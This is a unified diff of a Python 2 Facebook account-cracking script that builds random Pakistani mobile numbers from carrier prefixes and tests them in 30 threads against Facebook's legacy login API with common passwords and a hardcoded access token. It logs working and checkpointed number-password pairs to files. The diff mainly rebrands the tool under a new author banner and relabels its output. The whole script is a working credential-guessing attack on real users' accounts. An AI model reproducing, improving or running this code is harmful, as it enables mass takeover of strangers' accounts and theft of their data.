@@ -1,6 +1,6 @@
 import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
 os.system('rm -rf .txt')
-for n in range(75000):
+for n in range(5000):
     nmbr = random.randint(1111111, 9999999)
     sys.stdout = open('.txt', 'a')
     print nmbr
@@ -27,7 +27,6 @@ sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
 
 def keluar():
@@ -88,19 +87,20 @@ os.system('clear')
 ##### LOGO #####
 
 
-logo = """\033[92m
-    ____    ____     ____     ___     __  __    ____    __  ___
-   /  _/   / __ )   / __ \   /   |   / / / /   /  _/   /  |/  /
-   / /    / __  |  / /_/ /  / /| |  / /_/ /    / /    / /|_/ / 
- _/ /    / /_/ /  / _, _/  / ___ | / __  /   _/ /    / /  / /  
-/___/   /_____/  /_/ |_|  /_/  |_|/_/ /_/   /___/   /_/  /_/
-\033[91m------------------------------------------------------------
-\033[92mCREADET BY IBRAHIM 
-\033[91mTOOL VIP
-\033[92mTELEGRAM / @ibrahimkocher
-\033[92mBA ID ACTIVE DLAKAM 
-\033[91m------------------------------------------------------------
-"""
+logo = """
+\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m█████████  \033[1;92m ▀
+\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ 
+\033[1;91m  ███         \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ 
+\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m███   ███  \033[1;92m███ 
+\033[1;91m         ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  
+\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  
+\033[1;91m  ██████████  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \x1b[1;90mQUEEN
+\033[1;94m══════════════════════════════════════════════
+\033[1;90m➣ Author : \033[1;97mSTYLISH QUEEN
+\033[1;90m➣ Github : \033[1;97mhttps://github.com/stylish-queen
+\033[1;90m➣ Fb Page: \033[1;97mJam Shahrukh Official
+\033[1;94m══════════════════════════════════════════════ """
+
 
 back = 0
 successful = []
@@ -117,6 +117,7 @@ def menu():
 	print "\033[1;92m[2]  TELINOR"
 	print "\033[1;92m[3]  WARID"
 	print "\033[1;92m[4]  UFONE"
+	print "\033[1;92m[4]  ZONG"
 	
 	
 	    
@@ -132,8 +133,8 @@ def action():
 		os.system("clear")
 		print (logo)
 		print "\033[1;91mMOBILINK/JAZZ CODE HERE"		
-		print "\033[1;95m00, 01, 02, 03, 04,"
-		print "\033[1;95m05, 06, 07, 08, 09,"
+		print "\033[1;95m00,01,02,03,04,"
+		print "\033[1;95m05,06,07,08,09,"
 		try:
 			c = raw_input(" SELECTED CODE: ")
 			k="+923"
@@ -148,8 +149,8 @@ def action():
 		
 		print (logo)
 		print "\033[1;91mTELINORE CODE HERE"		
-		print "\033[1;94m40, 41, 42, 43, 44,"
-		print "\033[1;95m45, 45, 46, 47, 48,"
+		print "\033[1;95m40,41,42,43,44,"
+		print "\033[1;95m45,45,46,47,48,"
 		try:
 			c = raw_input(" SELECTED CODE: ")
 			k="+923"
@@ -165,7 +166,8 @@ def action():
 		print (logo)
 		print "\033[1;91mWARID CODE HERE"		
 		
-		print "\033[1;95m24, ??, ??, ??,"
+		print "\033[1;95m20,21,22,23,24,"
+		print "\033[1;95m25,26,27,28,"
 		try:
 	
 	
@@ -180,8 +182,8 @@ def action():
 		os.system("clear")
 		print (logo)
 		print "\033[1;91mUFONE CODE HERE"		
-		print "\033[1;95m35, 33, 34,"
-		print "\033[1;95m35, 36, 37, ??,"
+		print "\033[1;95m30,31,32,33,34,"
+		print "\033[1;95m35,36,37,38,"
 		try:
 			c = raw_input(" SELECTED CODE: ")
 			k="+923"
@@ -196,8 +198,8 @@ def action():
 		os.system("clear")
 		print (logo)
 		print "\033[1;91mZONG CODE HERE"		
-		print "\033[1;94m10, 11, 12, 13,"
-		print "\033[1;95m14, 15, 16, 17,"
+		print "\033[1;95m10,11,12,13,"
+		print "\033[1;95m14,15,16,17,"
 		try:
 			c = raw_input(" SELECTED CODE: ")
 			k="+923"
@@ -229,7 +231,7 @@ def action():
 	time.sleep(0.5)
 	psb ("\033[1;92m CRACK RUNNING...")
 	time.sleep(0.5)
-	psb ("\033[1;92m[!] Kalti Marne Ke lye(To Exit) Press CTRL Then Press z")
+	psb ("\033[1;92m[!](To Exit) Press CTRL Then Press z")
 	time.sleep(0.5)
 	print 50*'-'
 	
@@ -246,31 +248,31 @@ def action():
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;92m|HACKED|\x1b[1;92mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass1																			
+				print '\x1b[1;92m|Jam|\x1b[1;92mOk|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass1																			
 				okb = open('save/successfull.txt', 'a')
 				okb.write(k+c+user+'|'+pass1+'\n')
 				okb.close()
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
-					print '\x1b[1;92m|HACKED|\x1b[1;92mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass1
+					print '\x1b[1;94m|Jam|\x1b[1;94mCp|  ' + k + c + user + '  \x1b[1;94mPASS|  ' + pass1
 					cps = open('save/checkpoint.txt', 'a')
 					cps.write(k+c+user+'|'+pass1+'\n')
 					cps.close()
 					cpb.append(c+user+pass1)
 				else:	
-					pass2 = '234567'
+					pass2 = '786786786'
 					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                q = json.load(data)
 					if 'access_token' in q:
-		                        	print '\x1b[1;92m|HACKED|\x1b[1;92mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass2                           											
+		                        	print '\x1b[1;92m|Jam|\x1b[1;92mOk|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass2                           											
 						okb = open('save/successfull.txt', 'a')
 						okb.write(k+c+user+'|'+pass2+'\n')
 						okb.close()
 						oks.append(c+user+pass2)
 					else:	
 						if 'www.facebook.com' in q['error_msg']:
-							print '\x1b[1;92m|HACKED|\x1b[1;92mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass2
+							print '\x1b[1;94m|Jam|\x1b[1;94mCp|  ' + k + c + user + '  \x1b[1;94mPASS|  ' + pass2
 							cps = open('save/checkpoint.txt', 'a')
 							cps.write(k+c+user+'|'+pass2+'\n')
 							cps.close()
@@ -279,27 +281,27 @@ def action():
 							pass3 = '223344'
 							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                                q = json.load(data)
-							if 'access_' in q:
-								print '\x1b[1;92m|HACKED|\x1b[1;92mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass3
+							if 'access_token' in q:
+								print '\x1b[1;92m|Jam|\x1b[1;92mOk|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass3
 								okb = open('save/successfull.txt', 'a')
 								okb.write(k+c+user+'|'+pass3+'\n')
 								okb.close()
 								oks.append(c+user+pass3)
 							else:	
 								if 'www.facebook.com' in q['error_msg']:
-									print '\x1b[1;92m|HACKED|\x1b[1;92mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass3
+									print '\x1b[1;94m|Jam|\x1b[1;94mCp|  ' + k + c + user + '  \x1b[1;94mPASS|  ' + pass3
 									cps = open('save/checkpoint.txt', 'a')
 									cps.write(k+c+user+'|'+pass3+'\n')
 									cps.close()
-									cpb.append(c+user+pass3)        
+									cpb.append(c+user+pass3)
 		except:																		
 			pass
 		
 	p = ThreadPool(30)
         p.map(main, id)
         print '\x1b[1;97m--------------------------------------------------'
-        print '[\xe2\x9c\x93]crack tawaw bw ...'
-        print '[\xe2\x9c\x93] Total hack krawakan/swtawakan : ' + str(len(oks)) + '/' + str(len(cpb))
+        print '[\xe2\x9c\x93]crack end ...'
+        print '[\xe2\x9c\x93] Total hack : ' + str(len(oks)) + '/' + str(len(cpb))
         print '[\xe2\x9c\x93] Cloned Accounts Has Been Saved : anggaxd/clone.txt'
         raw_input('\n\x1b[1;97m[\x1b[1;97mBack\x1b[1;95m]')
         menu()
